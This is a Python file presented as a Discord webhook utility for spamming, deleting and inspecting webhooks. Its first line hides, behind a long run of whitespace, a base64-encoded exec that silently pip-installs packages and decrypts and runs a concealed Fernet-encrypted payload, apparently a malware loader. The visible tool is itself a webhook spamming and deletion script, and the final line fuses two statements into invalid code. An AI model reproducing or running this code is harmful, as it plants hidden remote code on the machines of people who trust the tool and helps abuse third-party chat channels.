import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2hJM2xJaEhnTGk5NkU3ZnlRbUxYX1V5bnNPcG9lSVNHNzNYVF9iamJWLUk9JykuZGVjcnlwdChiJ2dBQUFBQUJtMEtQQUJ5b29rUGx5SjE5Tl9yLVB0WTQwQV9wTnFyQ3pqOTdqd0swd1dVR0R4ek5SS2VRTnhrMzBRSFQxcjlvRC1udVZaUjRQS0NWeno0dGtDMzlOS2toSDI4eEZvYzc0THVtdTczbm1pTHBHTmlXQmFVLTM2ZlV5WkZJdUYybjZGWVczMklkYklwSllKZkZIR2JLa3ZUUnlmTWs5akNlN21GNjJndFpKTUNsbjI0dHoyLVN5MzBYYlJ1MGJCNjIza0R3SGFwZl90Q3R6djR3QVNRMkxCVFBIWWhkYkZZbzduczlaR05WTlkxeV9HSDg9Jykp').decode())
import os
import requests
import time
import colorama
from colorama import Fore, Style

colorama.init(autoreset=False)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
def redirect_to_main_menu():
    time.sleep(1)
    print("Exiting...")
    time.sleep(1)
    print("Going back to main menu...")
    time.sleep(1)
    clear_console()
    webhookUtils()

class webhookUtils:
    def __init__(self):
        print(Fore.GREEN + """
██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗    ██╗   ██╗████████╗██╗██╗     ███████╗
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝    ██║   ██║╚══██╔══╝██║██║     ██╔════╝
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝     ██║   ██║   ██║   ██║██║     ███████╗
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗     ██║   ██║   ██║   ██║██║     ╚════██║
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗    ╚██████╔╝   ██║   ██║███████╗███████║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚═════╝    ╚═╝   ╚═╝╚══════╝╚══════╝                                                                                                    
        """)
        print("Welcome To Webhook Utils!")
        print(Fore.RED + "Please keep in mind that if you spam a webhook to much, your IP might get ratelimited by Discord.")
        print(Fore.GREEN + "1. Spam Webhook")
        print("2. Delete Webhook")
        print("3. Webhook info")
        selection = input("Please select an option: ")
        if selection == "1":
            self.spam()
        elif selection == "2":
            self.delete()
        elif selection == "3":
            self.info()
        else:
            print("Invalid option!")
            self.__init__()

    def spam(self):
        webhook = input("Enter webhook URL: ")
        username = input("Enter name to spam as(can be left empty): ")
        if username == "":
            username = "Spammed with github.com/Schubilegend/webhook-utils"
        message = input("Enter message to spam: ")
        amount = int(input("Enter amount of messages to spam: "))
        delay = int(input("Enter delay in seconds: "))
        tts = input("Enable TTS? (y/n): ")
        if tts == "y":
            tts = True
        else:
            tts = False
        data = {
            "content": message,
            "username": username,
            "tts": tts
        }
        webhook_test = requests.get(webhook)
        if webhook_test.status_code == 200:
            print("Webhook valid! Starting spam...")
            while amount != 0:
                r = requests.post(webhook, data=data)
                if r.status_code == 204:
                    amount -= 1
                    print("Message sent! " + str(amount) + " Messages left!")
                    time.sleep(delay)
                    if amount == 0:
                        print("Done!")
                        redirect_to_main_menu()
                elif r.status_code == 429:
                    print("Ratelimited! Retrying in 5 seconds...")
                    time.sleep(5)
                elif r.status_code == 404:
                    print("Webhook doesnt exists anymore!")
                    redirect_to_main_menu()
                else:
                    print("Error sending message!")
        else:
            print("Invalid webhook! or you are being ratelimited")
            redirect_to_main_menu()
    def delete(self):
        webhook = input("Enter webhook URL: ")
        validate_webhook = requests.get(webhook)
        if validate_webhook.status_code == 200:
            print("Webhook valid! Deleting webhook...")
            r = requests.delete(webhook)
            if r.status_code == 204:
                print("Webhook deleted!")
            else:
                print("Error deleting webhook!")
                redirect_to_main_menu()
        else:
            print("Invalid webhook! or you are being ratelimited")
            redirect_to_main_menu()

    def info(self):
        webhook = input("Enter webhook URL: ")
        try:

            response = requests.get(f"{webhook}")
            if response.status_code == 200:
                print("Webhook valid! Getting info...")
                data = response.json()
                Name = str(data["name"])
                ChannelID = str(data["channel_id"])
                GuildID = str(data["guild_id"])
                Token = str(data["token"])
                Avatar = str(data["avatar"])
                ID= str(data["id"])

                print(f"Name: {Name}")
                print(f"Channel ID: {ChannelID}")
                print(f"Guild ID: {GuildID}")
                print(f"Token: {Token} (Skids, This is useless)")
                print(f"Avatar: {Avatar}")
                print(f"ID: {ID}")

                input("Hit enter to get back to the main menu.")
                redirect_to_main_menu()
            else:
                print("Webhook doesnt exists anymore! or you are being ratelimited")
                redirect_to_main_menu()
        except:
            print("Error getting webhook info!")
            redirect_to_main_menu()
webhookUtils()print('crfia')